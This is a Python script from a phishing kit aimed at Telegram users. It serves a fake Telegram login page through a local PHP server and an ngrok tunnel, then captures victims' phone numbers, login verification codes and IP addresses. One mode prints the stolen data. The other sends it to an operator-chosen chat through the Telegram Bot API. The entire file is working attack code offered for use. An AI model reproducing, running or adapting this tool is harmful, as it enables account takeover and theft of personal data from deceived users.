import os
import json
import time
import sys
import requests
from banners import banner
from colorama import Fore,Style
from subprocess import Popen
from pyngrok import ngrok
o = open("./fakepages/telegram/ip.txt","w")
ab = o.write("")
o.close()
file_op = open("./fakepages/telegram/num.json","w")
hajm_file = file_op.write("")
file_op.close()

myfile = open("./fakepages/telegram/log.json","w")
myfile2 = myfile.write("")
myfile.close()
stat_file = 0
def file():
    try:
      def server():
        with open("server","w") as phplog:
          Popen(("php","-S","localhost:9090","-t","./fakepages/telegram"),stderr=phplog,stdout=phplog)
      server()
      url = ngrok.connect("9090","http").replace("http","https")
      os.system("clear")
      time.sleep(3)
      os.system("clear")
      banner.baner()
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"!"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.YELLOW+"Please Wait . . . !\n")
      time.sleep(3)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTGREEN_EX+"Runing PHP server . . . !\n")
      time.sleep(2)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.RED+"Runing ngrok . . . !\n")
      time.sleep(1)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.GREEN+"Your URL"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+url+Style.RESET_ALL+"\n")
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Waiting for Login Info,"+Fore.LIGHTRED_EX+" Ctrl + C "+Fore.LIGHTYELLOW_EX+"to Exit . . . !\n")
      def info():
          global stat_file
          if not str(os.stat("./fakepages/telegram/num.json").st_size) == stat_file:
              stat_file = str(os.stat("./fakepages/telegram/num.json").st_size)
              files = open("./fakepages/telegram/num.json","r")
              hajm_file = files.read()
              try:
                  infor = json.loads(hajm_file)
                  for vlu in infor['dev']:
                      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Phone Number"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+vlu["number"])
                      file_op = open("./fakepages/telegram/num.json","w")
                      hajm_file = file_op.write("")
                      file_op.close()
              except:
                print("")
          elif not str(os.stat("./fakepages/telegram/log.json").st_size) == stat_file:
              stat_file = str(os.stat("./fakepages/telegram/log.json").st_size)
              files2 = open("./fakepages/telegram/log.json","r")
              myfile2 = files2.read()
              try:
                  infor2 = json.loads(myfile2)
                  for vlu2 in infor2['dev']:
                      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Code"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+vlu2["code"])
                      myfile = open("./fakepages/telegram/log.json","w")
                      myfile2 = file_op.write("")
                      myfile.close()
              except:
                print("")
      def getip():
        global stat_file
        if not str(os.stat("./fakepages/telegram/ip.txt").st_size) == stat_file:
          stat_file = str(os.stat("./fakepages/telegram/ip.txt").st_size)
          files = open("./fakepages/telegram/ip.txt","r")
          i = files.readlines()
          try:
            i = i[-1]
            print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Target Entered Link :) \n"+Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTCYAN_EX+"Target IP : %s"%(i))
            o = open("./fakepages/telegram/ip.txt","w")
            ab = o.write("")
            o.close()
          except:
            print(" ")
      while True:
          info()
          getip()
    except KeyboardInterrupt:
      os.system("pkill php")
      print(Fore.LIGHTCYAN_EX+"\n [✓] Exit :)")
      time.sleep(1)
def bot():
    try:
      banner.baner()
      token = input(Fore.LIGHTRED_EX+" ["+Fore.WHITE+"*"+Fore.LIGHTRED_EX+"] "+Fore.LIGHTCYAN_EX+"Enter your Telegram Robot Token"+Fore.LIGHTBLUE_EX+" : >> "+Fore.WHITE)
      myid = input(Fore.LIGHTRED_EX+" ["+Fore.WHITE+"*"+Fore.LIGHTRED_EX+"] "+Fore.LIGHTCYAN_EX+"Enter your Telegram chat ID"+Fore.RED+" (numeric ID)"+Fore.LIGHTBLUE_EX+" : >> "+Fore.WHITE)
      def server():
        with open("server","w") as phplog:
          Popen(("php","-S","localhost:9090","-t","./fakepages/telegram"),stderr=phplog,stdout=phplog)
      server()
      url = ngrok.connect("9090","http").replace("http","https")
      os.system("clear")
      time.sleep(3)
      os.system("clear")
      banner.baner()
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"!"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.YELLOW+"Please Wait . . . !\n")
      time.sleep(3)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTGREEN_EX+"Runing PHP server . . . !\n")
      time.sleep(2)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.RED+"Runing ngrok . . . !\n")
      time.sleep(1)
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.GREEN+"Your URL"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+url+Style.RESET_ALL+"\n")
      print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Waiting for Login Info,"+Fore.LIGHTRED_EX+" Ctrl + C "+Fore.LIGHTYELLOW_EX+"to Exit . . . !\n")
      def info():
          global stat_file
          if not str(os.stat("./fakepages/telegram/num.json").st_size) == stat_file:
              stat_file = str(os.stat("./fakepages/telegram/num.json").st_size)
              files = open("./fakepages/telegram/num.json","r")
              hajm_file = files.read()
              try:
                  infor = json.loads(hajm_file)
                  for vlu in infor['dev']:
                      user_pass = ("🌐 User information :\n\n"+"▪️ Phone Number : "+vlu["number"]+" 💡\n"+"➖➖➖➖➖➖➖➖➖➖➖➖\n\n"+"👨‍💻Coded By : @Pico_Team_Hack => @x_darkpy_x :)")
                      #####################
                      data_url = f"https://api.telegram.org/bot{token}/SendMessage?chat_id={myid}&text={user_pass}"
                      ######################
                      #######################
                      proxy = {
                        "https":"http://localhost:8000",
                        "http":"http://localhost:8000"
                      }
                      requests.get(data_url,proxies=proxy)
                      file_op = open("./fakepages/telegram/num.json","w")
                      hajm_file = file_op.write("")
                      file_op.close()
              except:
                print("")
          elif not str(os.stat("./fakepages/telegram/log.json").st_size) == stat_file:
              stat_file = str(os.stat("./fakepages/telegram/log.json").st_size)
              files2 = open("./fakepages/telegram/log.json","r")
              myfile2 = files2.read()
              try:
                  infor2 = json.loads(myfile2)
                  for vlu2 in infor2['dev']:
                      user_pass2 = ("🌐 User information :\n\n"+"▪️ Code : "+vlu2["code"]+" 💡\n"+"➖➖➖➖➖➖➖➖➖➖➖➖\n\n"+"👨‍💻Coded By : @Pico_Team_Hack => 👨‍💻 @x_darkpy_x :)")
                      #####################
                      data_url2 = f"https://api.telegram.org/bot{token}/SendMessage?chat_id={myid}&text={user_pass2}"
                      proxy = {
                        "https":"http://localhost:8000",
                        "http":"http://localhost:8000"
                      }
                      requests.get(data_url2,proxies=proxy)
                      myfile = open("./fakepages/telegram/log.json","w")
                      myfile2 = file_op.write("")
                      myfile.close()
              except:
                print("")
      def getip():
        global stat_file
        if not str(os.stat("./fakepages/telegram/ip.txt").st_size) == stat_file:
          stat_file = str(os.stat("./fakepages/telegram/ip.txt").st_size)
          files = open("./fakepages/telegram/ip.txt","r")
          i = files.readlines()
          try:
            i = i[-1]
            target_ip = ("[⚡️] Target entered the link :)\n\n🌐 -> IP: %s"%(i)+"\n➖➖➖➖➖➖➖➖➖➖➖➖\n\n"+"👨‍💻Coded By : @Pico_Team_Hack > 👨‍💻 @x_darkpy_x :)")
            ##########################
            data_ip = f"https://api.telegram.org/bot{token}/SendMessage?chat_id={myid}&text={target_ip}"
            ##########################
            proxi = {
              "https":"http://localhost:8000",
              "http":"http://localhost:8000"
            }
            ##########################
            requests.get(data_ip,proxies=proxi)
            ##########################
            o = open("./fakepages/telegram/ip.txt","w")
            ab = o.write("")
            o.close()
          except:
            print(" ")
      while True:
          info()
          getip()
    except KeyboardInterrupt:
      os.system("pkill php")
      print(Fore.LIGHTCYAN_EX+"\n [✓] Exit :)")
      time.sleep(1)